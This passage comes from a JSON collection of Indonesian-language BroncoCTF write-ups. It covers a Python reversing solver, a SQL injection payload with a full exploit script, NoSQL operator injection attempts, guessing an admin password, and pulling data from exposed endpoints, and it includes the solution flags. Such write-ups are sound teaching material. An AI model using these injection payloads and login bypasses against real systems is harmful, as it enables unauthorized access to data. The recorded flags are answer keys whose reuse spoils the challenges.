    "solution": [
      {
        "title": "Source penting",
        "content": "```python\npivot = src.index(\"MIRROR_SURFACE_DO_NOT_SCRATCH\")\nspecular_map = hashlib.sha256(src[pivot:pivot+300].encode()).digest()\n```\n\ndan:\n\n```python\nlooking_glass = \"MirrorMirror\"\n\nfor i, b in enumerate(blob):\n    reflection_byte = (\n        specular_map[i % len(specular_map)]\n        ^ ord(looking_glass[i % len(looking_glass)])\n    )\n    flag += chr(b ^ reflection_byte)\n```\n\nProses verifikasi menghasilkan:\n\n```text\nflag_byte = blob_byte ^ specular_map_byte ^ looking_glass_byte\n```\n\nKarena XOR bersifat reversibel, solver hanya perlu menjalankan rumus yang sama."
      },
      {
        "title": "Anti-debug",
        "content": "Ada dua pemeriksaan tambahan:\n\n```python\nif sys.gettrace() is not None:\n    return \"Nice try, but the glass turns opaque. No observers allowed!\"\n```\n\ndan:\n\n```python\nif sys._getframe().f_code.co_name != 'verify' or __name__ != \"__main__\":\n    return \"You are looking at the mirror from a distorted angle.\"\n```\n\nKeduanya tidak perlu dibypass. Solver membaca source file secara langsung lalu menghitung flag di luar fungsi `verify()`."
      },
      {
        "title": "Solver",
        "content": "Simpan `solve.py` di folder yang sama dengan `mirror.py`, lalu jalankan:\n\n```bash\npython3 solve.py\n```\n\nSolver:\n\n```python\n#!/usr/bin/env python3\nimport hashlib\nfrom pathlib import Path\n\nMARKER = \"MIRROR_SURFACE_DO_NOT_SCRATCH\"\nLOOKING_GLASS = \"MirrorMirror\"\nBLOB = [\n    17, 241, 10, 247, 215, 233, 146, 221, 156, 40,\n    37, 198, 153, 173, 10, 103, 20, 56, 232, 116,\n    208, 121, 53, 12, 122, 86, 127, 164, 109, 62,\n    88, 200, 127, 234, 5,\n]\n\nsource = Path(\"mirror.py\").read_text()\npivot = source.index(MARKER)\nspecular_map = hashlib.sha256(\n    source[pivot:pivot + 300].encode()\n).digest()\n\nflag = \"\"\nfor i, encrypted_byte in enumerate(BLOB):\n    reflection_byte = (\n        specular_map[i % len(specular_map)]\n        ^ ord(LOOKING_GLASS[i % len(LOOKING_GLASS)])\n    )\n    flag += chr(encrypted_byte ^ reflection_byte)\n\nprint(flag)\n```"
      },
      {
        "title": "Output",
        "content": "```text\n<FLAG>bronco{wh0_1s_th3_f@ir3st_r3v3rs3r}</FLAG>\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport hashlib\r\nfrom pathlib import Path\r\n\r\n\r\nMARKER = \"MIRROR_SURFACE_DO_NOT_SCRATCH\"\r\nLOOKING_GLASS = \"MirrorMirror\"\r\nBLOB = [\r\n    17, 241, 10, 247, 215, 233, 146, 221, 156, 40,\r\n    37, 198, 153, 173, 10, 103, 20, 56, 232, 116,\r\n    208, 121, 53, 12, 122, 86, 127, 164, 109, 62,\r\n    88, 200, 127, 234, 5,\r\n]\r\n\r\n\r\ndef recover_flag(source_path: Path) -> str:\r\n    source = source_path.read_text(encoding=\"utf-8\")\r\n\r\n    try:\r\n        pivot = source.index(MARKER)\r\n    except ValueError as exc:\r\n        raise RuntimeError(f\"Marker {MARKER!r} tidak ditemukan\") from exc\r\n\r\n    specular_map = hashlib.sha256(\r\n        source[pivot:pivot + 300].encode()\r\n    ).digest()\r\n\r\n    plaintext = bytearray()\r\n    for i, encrypted_byte in enumerate(BLOB):\r\n        reflection_byte = (\r\n            specular_map[i % len(specular_map)]\r\n            ^ ord(LOOKING_GLASS[i % len(LOOKING_GLASS)])\r\n        )\r\n        plaintext.append(encrypted_byte ^ reflection_byte)\r\n\r\n    return plaintext.decode(\"utf-8\")\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(\r\n        description=\"Recover the flag from BroncoCTF Mirror Mirror\"\r\n    )\r\n    parser.add_argument(\r\n        \"source\",\r\n        nargs=\"?\",\r\n        default=\"mirror.py\",\r\n        type=Path,\r\n        help=\"path ke file mirror.py (default: ./mirror.py)\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    flag = recover_flag(args.source)\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{wh0_1s_th3_f@ir3st_r3v3rs3r}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-web-forbiddenarchives",
    "title": "Forbidden Archives",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "---\ntitle: \"Forbidden Archives\"\nctf: \"BroncoCTF\"\ndate: 2026-07-12\ncategory: web\ndifficulty: unknown\npoints: 0\nflag_format: \"bronco{...}\"\nauthor: \"rhnataiet23-art\"\n---",
    "problemDescription": "---\ntitle: \"Forbidden Archives\"\nctf: \"BroncoCTF\"\ndate: 2026-07-12\ncategory: web\ndifficulty: unknown\npoints: 0\nflag_format: \"bronco{...}\"\nauthor: \"rhnataiet23-art\"\n---\n\n\nPencarian buku dibangun dengan string SQL dan hanya menampilkan baris dengan `is_secret = 0`. Input dimasukkan ke dalam `LOWER('%<search>%')`, sehingga penutup quote dan kurung dapat mengubah predicate lalu mengomentari filter rahasia.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "`search=%` menampilkan buku publik. Input satu quote memunculkan error SQLite berikut:\n\n```text\nunrecognized token: \"') AND is_secret = 0 LIMIT 1\"\n```\n\nFragmen tersebut menunjukkan bentuk query efektifnya:\n\n```sql\n... WHERE LOWER(title) LIKE LOWER('%<search>%') AND is_secret = 0 LIMIT 1\n```\n\nKeyword `OR` difilter, jadi bypass memakai predicate tanpa `OR`. Payload menutup `LOWER()`, menambahkan pencarian judul target, lalu mengomentari sisa query:\n\n```sql\n') AND lower(title) LIKE lower('%All%Knowledge%') -- -\n```\n\nQuery yang terbentuk:\n\n```sql\n... WHERE LOWER(title) LIKE LOWER('%')\n    AND lower(title) LIKE lower('%All%Knowledge%') -- -%')\n    AND is_secret = 0 LIMIT 1\n```\n\nFilter `is_secret = 0` tidak lagi dieksekusi dan buku target dikembalikan."
      },
      {
        "title": "Solver",
        "content": "```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\n```\n\nOutput:\n\n```text\nbronco{y0u_d3f3@t3d_th3_h1gh_c0unc1l}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Exploit the SQL injection in Forbidden Archives and print the flag.\"\"\"\r\n\r\nimport re\r\nimport sys\r\n\r\nimport requests\r\n\r\nURL = \"https://broncoctf-forbidden-archives.chals.io/\"\r\nPAYLOAD = \"') AND lower(title) LIKE lower('%All%Knowledge%') -- -\"\r\n\r\n\r\ndef main() -> None:\r\n    response = requests.get(URL, params={\"search\": PAYLOAD}, timeout=15)\r\n    response.raise_for_status()\r\n\r\n    flag = re.search(r\"bronco\\{[^\\s<}]+\\}\", response.text)\r\n    if not flag:\r\n        print(\"Flag was not present in the response.\", file=sys.stderr)\r\n        sys.exit(1)\r\n    print(flag.group(0))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{y0u_d3f3@t3d_th3_h1gh_c0unc1l}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-web-lovelylogin",
    "title": "LovelyLogin",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": ";;;;;;;;;;;# LovelyLogin — BroncoCTF Web Writeup",
    "problemDescription": "> Welcome to our lovely new login page 💕. The developers swear it's secure… but they may have forgotten to clean up a few things before launch. Can you figure out how authentication works and log in as the right user? P.S. please follow my wishes and do not scrape it...\n\nTarget: `https://broncoctf-lovely-login.chals.io/`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon Awal",
        "content": "Halaman utama menampilkan form login sederhana (username + password) yang mengirim request `POST /login` berisi JSON:\n\n```json\n{\"username\": \"...\", \"password\": \"...\"}\n```\n\nResponse dari server memberi pesan berbeda tergantung kondisi:\n- Username tidak ditemukan → `No such user`\n- Username ditemukan, password salah → `Wrong password`\n- Login sukses → halaman HTML berisi flag\n\nPerbedaan pesan error ini (**user enumeration via error message**) jadi petunjuk pertama bahwa validasi username dan password dilakukan terpisah."
      },
      {
        "title": "Percobaan NoSQL Injection",
        "content": "Karena aplikasi menggunakan Express (`X-Powered-By: Express`) dan responsnya mengindikasikan pengecekan berbasis dokumen (mirip MongoDB), dicoba NoSQL injection klasik:\n\n```bash\ncurl -s -X POST https://broncoctf-lovely-login.chals.io/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}'\n```\n\nHasil: `No such user` — artinya field `username` tidak vulnerable terhadap operator MongoDB (kemungkinan di-cast paksa ke string atau di-strict-compare).\n\nPercobaan lanjutan dengan `$ne`, `$gt`, `$regex` pada field `password` (dengan `username: admin`) semua tetap menghasilkan `Wrong password`. Kesimpulan: **NoSQL injection tidak berhasil** — aplikasi kemungkinan melakukan sanitasi/tipe-checking input sebelum query."
      },
      {
        "title": "Menemukan Informasi Bocor",
        "content": "### 1. `robots.txt`\n\n```bash\ncurl -s https://broncoctf-lovely-login.chals.io/robots.txt\n```\n\n```\nUser-agent: *\nDisallow: /security\n```\n\nMeskipun challenge meminta untuk *\"tidak melakukan scraping\"*, mengecek `robots.txt` secara manual (bukan automated scraping/crawling) adalah langkah recon standar. String base64 di komentar ternyata berisi daftar username:\n\n```bash\necho \"amVmZixzYXJhaCxhZG1pbixndWVzdA==\" | base64 -d\n# jeff,sarah,admin,guest\n```\n\n### 2. Endpoint `/security` (yang justru \"di-disallow\")\n\nEndpoint yang di-disallow di `robots.txt` biasanya sengaja disembunyikan dari crawler tapi tetap bisa diakses langsung:\n\n```bash\ncurl -s -i https://broncoctf-lovely-login.chals.io/security\n```\n\nIsi halaman:\n\n```\nInternal Security Notes\nStatus: Work in progress\n- Passwords are derived from usernames\n- Current implementation stores them backwards for obfuscation\n- Planned upgrade: hashing + salting\nTODO: remove this page before production deployment!\n```\n\nIni adalah kunci utama solusi: **password = username yang dibalik (reversed string)**, bukan hash sama sekali."
      },
      {
        "title": "Eksploitasi",
        "content": "Untuk user `admin`, password adalah `admin` dibalik → `nimda`.\n\n```bash\ncurl -s -X POST https://broncoctf-lovely-login.chals.io/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\":\"nimda\"}'\n```\n\nResponse:\n\n```html\n<h2>Welcome, admin.</h2>\n<img src=\"https://media.giphy.com/...\" style=\"max-width:300px;\"><br>\n<pre>bronco{R3v3rs1ng_1s_S3cure}</pre>\n```\n\n**Flag: `bronco{R3v3rs1ng_1s_S3cure}`**"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{R3v3rs1ng_1s_S3cure}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-web-supersecurepassword",
    "title": "BroncoCTF 2026 - Super Secure Server (Web)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge BroncoCTF 2026 - Super Secure Server (Web)",
    "problemDescription": "",
    "tools": [],
    "analysis": "Tantangan ini menyajikan sebuah halaman login yang mengklaim sangat aman karena username disembunyikan. Namun, pemeriksaan pada kode sumber sisi klien (client-side script) mengungkapkan bahwa aplikasi mengambil kredensial langsung dari sebuah endpoint API untuk melakukan komparasi string sebelum mengirimkan status otentikasi ke backend.\n\n### Vulnerability Point\n\nAplikasi mengalami kerentanan **Information Disclosure / Broken Authentication**. Endpoint API sensitif `/api/config` dibiarkan terbuka untuk publik tanpa mekanisme otorisasi, mengekspos username dan password secara mentah (plaintext) ke sisi klien.",
    "solution": [
      {
        "title": "Langkah Eksploitasi",
        "content": "1. Melakukan request ke endpoint `/api/config` menggunakan `curl` untuk mengambil data JSON berisi kredensial.\n2. Mendapatkan kredensial berupa:\n   - Username: `SuperSecretUser`\n   - Password: `rji32orj932r3209r233sqmet4v2cxbns8`\n3. Mengirimkan request POST ke `/login` dengan payload `{\"authenticated\": true}` atau melakukan login langsung via browser menggunakan kredensial tersebut untuk mendapatkan flag."
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-web-thekeymaster",
    "title": "The Keymaster",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "**Kategori:** Web / Misc\n**Challenge:** The Keymaster\n**Flag:** `bronco{h3y_y0u_f0und_th3m_4ll_w1th_4b501ut31y_n0_w0rr135_4t_411}`",
    "problemDescription": "> The Keymaster has split a flag into 8 keys and hid them in plain sight. Quite literally, as they're on our advertisement page! Ready your cursor-pointers, pull out your trusty inspection panel, and find them quickly, detective!\n\nTarget: `https://broncosec.com/BroncoCTF`\n\nPetunjuk penting di deskripsi:\n- **\"in plain sight\"** → sebagian piece ada langsung di HTML/attribute, gak perlu effort besar\n- **\"cursor-pointers\"** → beberapa elemen punya `class=\"cursor-pointer\"`, artinya perlu di-klik untuk trigger event\n- **\"inspection panel\"** → perlu DevTools/Inspect Element, bukan cukup `curl` biasa\n\nSitus ini dibangun pakai **Next.js** (terlihat dari struktur `_next/static/chunks/...js`), jadi sebagian konten di-render client-side lewat JavaScript — beberapa piece gak akan muncul di raw HTML dari `curl`, harus dibaca dari source JS atau dipicu lewat interaksi browser.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon Awal",
        "content": "`curl` ke halaman utama menunjukkan halaman statistik \"BroncoCTF\" dengan berbagai section: hero, About the Competition, Prize Pool, 2025 Statistics, Past Repositories, dan Sponsor. Beberapa piece langsung kelihatan di raw HTML karena ada di atribut HTML:\n\n```bash\ncurl https://broncosec.com/BroncoCTF\n```"
      },
      {
        "title": "Peta 8 Piece Flag",
        "content": "| # | Piece | Cara ditemukan |\n|---|-------|-----------------|\n| 1 | `bronco{h` | Teks polos di footer halaman |\n| 2 | `3y_y0u_f` | Muncul setelah klik kata **\"flags\"** (elemen `cursor-pointer`) di paragraf About |\n| 3 | `0und_th3` | Atribut `title=\"3 - 0und_th3\"` pada tombol **\"Join the Competition\"** |\n| 4 | `m_4ll_w1` | Muncul di `document.cookie` setelah klik emoji **🙋** (elemen `id=\"cookie\"`) |\n| 5 | `th_4b501` | HTML comment tersembunyi, hanya terlihat lewat source JS |\n| 6 | `ut31y_n0` | Query parameter di `href=\"/BroncoCTF?KEY=6-ut31y_n0\"` (link \"BroncoCTF 2026...?\") |\n| 7 | `_w0rr135` | Isi file **`/7.txt`** (di-download via link \"2026\") |\n| 8 | `_4t_411}` | Atribut `alt=\"8 - _4t_411}\"` pada gambar stat card terakhir |\n\nDigabung urut 1→8:\n\n```\nbronco{h + 3y_y0u_f + 0und_th3 + m_4ll_w1 + th_4b501 + ut31y_n0 + _w0rr135 + _4t_411}\n= bronco{h3y_y0u_f0und_th3m_4ll_w1th_4b501ut31y_n0_w0rr135_4t_411}\n```\n\nDecode leetspeak: *\"hey you found them all with absolutely no worries at all\"* 😄"
      },
      {
        "title": "Walkthrough Detail",
        "content": "### Piece 1, 3, 6, 8 — Langsung di HTML (view-source / curl)\n\nEmpat piece ini muncul langsung di atribut HTML statis, bisa ditemukan cukup dengan `curl` atau View Page Source:\n\n```bash\ncurl -s https://broncosec.com/BroncoCTF | grep -oE '[0-9] - [a-zA-Z_][a-zA-Z0-9_{}]*'\n```\n\n- **Piece 1** ada di teks footer: `\"...Art by Anni L. '28<br/>1 - bronco{h\"`\n- **Piece 3** ada di `title` tombol \"Join the Competition\": `title=\"3 - 0und_th3\"`\n- **Piece 6** ada di `href` kartu \"BroncoCTF 2026...?\": `href=\"/BroncoCTF?KEY=6-ut31y_n0\"`\n- **Piece 8** ada di `alt` gambar stat card terakhir (yang jumlahnya \"7340\"): `alt=\"8 - _4t_411}\"`\n\n### Piece 7 — File Terpisah\n\nTombol tahun \"**2026**\" di paragraf About ternyata sebuah link `<a href=\"/7.txt\" download=\"7.txt\">2026</a>` yang men-download file teks:\n\n```bash\ncurl -s https://broncosec.com/7.txt\n# 7 - _w0rr135\n```\n\n### Piece 2 — Klik Elemen \"flags\"\n\nKata **\"flags\"** di paragraf About the Competition punya `class=\"cursor-pointer\"` dan `onClick` handler. Meng-klik-nya menjalankan JS yang meng-append teks ke `<div id=\"addtext\">` (awalnya kosong):\n\n```javascript\nonClick: () => {\n  let e = document.getElementById(\"addtext\");\n  e.firstChild.textContent += \"2 - 3y_y0u_f\";\n  new Audio(\"ding.oga\").play();\n}\n```\n\nVerifikasi di console browser setelah klik:\n```javascript\nconsole.log(document.getElementById('addtext').innerText);\n// 2 - 3y_y0u_f\n```\n\n### Piece 4 — Klik Emoji 🙋 (Cookie)\n\nEmoji **🙋** (`id=\"cookie\"`) juga punya `onClick` handler, tapi bedanya piece ini **disimpan sebagai browser cookie**, bukan langsung dirender ke DOM:\n\n```javascript\nonClick: () => {\n  document.cookie = \"KEY4=4 - m_4ll_w1; path=/\";\n  let e = document.getElementById(\"cookie\");\n  e.firstChild.textContent += \"🍪\";\n  new Audio(\"puzzle.oga\").play();\n}\n```\n\nKlik sekali saja sudah cukup untuk set cookie. Klik berulang cuma nambah emoji 🍪 (visual saja, bukan mekanisme reveal). Verifikasi via:\n```javascript\nconsole.log(document.cookie);\n// KEY4=4 - m_4ll_w1\n```\n\n### Piece 5 — HTML Comment Tersembunyi (Paling Tricky)\n\nPiece ini **tidak muncul di curl maupun DevTools Elements panel biasa**, karena di-render lewat komponen React khusus yang secara sengaja meng-convert dirinya sendiri jadi HTML comment:\n\n```javascript\nfunction a({comment: e}) {\n  let n = useRef(null);\n  useEffect(() => {\n    n.current && (n.current.outerHTML = `<!-- ${e} -->`);\n  }, [e]);\n  return <script ref={n} type=\"text/placeholder\" />;\n}\n// dipanggil dengan:\n<a comment=\"!!! 5 - th_4b501 !!!\" />\n```\n\nKomponen ini merender sebuah `<script type=\"text/placeholder\">` kosong, lalu lewat `useEffect` menggantikan elemen tersebut jadi **HTML comment** berisi piece flag. Karena ini komentar HTML (`<!-- ... -->`), dia:\n- Tidak terlihat visual di halaman\n- Tidak ter-grep gampang di curl biasa (karena berada dalam comment yang dirender ulang oleh JS, bukan comment build-tool seperti di `<head>`)\n- Baru kelihatan kalau kita baca **source code JS bundle** langsung\n\nCara menemukannya: download & grep JS chunk yang menangani komponen ini:\n\n```bash\ncurl -s \"https://broncosec.com/_next/static/chunks/e785679bf8074938.js\" -o /tmp/cookie.js\ngrep -n \"cookie\\|onClick\\|addtext\" /tmp/cookie.js\n```\n\nDari situ ketemu seluruh source JSX halaman, termasuk baris:\n```\n(0,t.jsx)(a,{comment:\"!!! 5 - th_4b501 !!!\"})\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{h3y_y0u_f0und_th3m_4ll_w1th_4b501ut31y_n0_w0rr135_4t_411}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-web-unblurme",
    "title": "Unblur Me",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge Unblur Me",
    "problemDescription": "Service meminta user menyelesaikan 500 soal kalkulus untuk menghilangkan efek CSS blur pada gambar rahasia image_f84dc2.png.\n\nMasalah utamanya adalah gambar rahasia tersebut langsung diambil dari API saat halaman pertama kali dimuat, tanpa ada verifikasi skor atau sesi di sisi server. Validasi skor 500 hanya diterapkan di sisi browser (client-side) untuk mengubah properti CSS filter: `blur(20px)` menjadi `none`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Source yang relevan",
        "content": "Fungsi pengambilan aset gambar langsung saat inisialisasi halaman:\n\n```javascript\nfunction loadSecretImage() {\n  fetch('/api/v1/internal/fetch-config-blob')\n    .then(response => {\n      if (!response.ok) throw new Error(\"Failed to load\");\n      return response.blob();\n    })\n    .then(blob => {\n      const blobUrl = URL.createObjectURL(blob);\n      const img = document.getElementById('flag-image');\n      img.src = blobUrl;\n    })\n}\n```\n\nLogika bypass filter CSS yang hanya berjalan di sisi klien:\n\n```javascript\nif (correctCount >= 500) {\n  document.getElementById('quiz-area').innerHTML = \"<h2>ACCESS GRANTED</h2>\";\n  const flag = document.getElementById('flag-image');\n  flag.style.filter = \"none\";\n  flag.style.pointerEvents = \"auto\";\n}\n```"
      },
      {
        "title": "Langkah Eksploitasi",
        "content": "Karena endpoint `/api/v1/internal/fetch-config-blob` terbuka secara publik dan langsung mengembalikan file gambar asli, kita dapat mengunduhnya secara langsung tanpa harus berinteraksi dengan kuis matematika:\n\n```bash\ncurl -s https://broncoctf-unblur-me.chals.io/api/v1/internal/fetch-config-blob --output flag.png\n```\n\nSetelah `flag.png` (yang mereferensikan file `image_f84dc2.png`) terunduh, kita dapat membukanya untuk melihat teks flag secara utuh tanpa sensor blur CSS."
      }
    ],
    "terminalOutputs": [],
    "flag": "BRONCO{1_WOULDNT_M@K3_YOU_DO_C@LCULUS}",
    "lessonsLearned": ""
  }
];
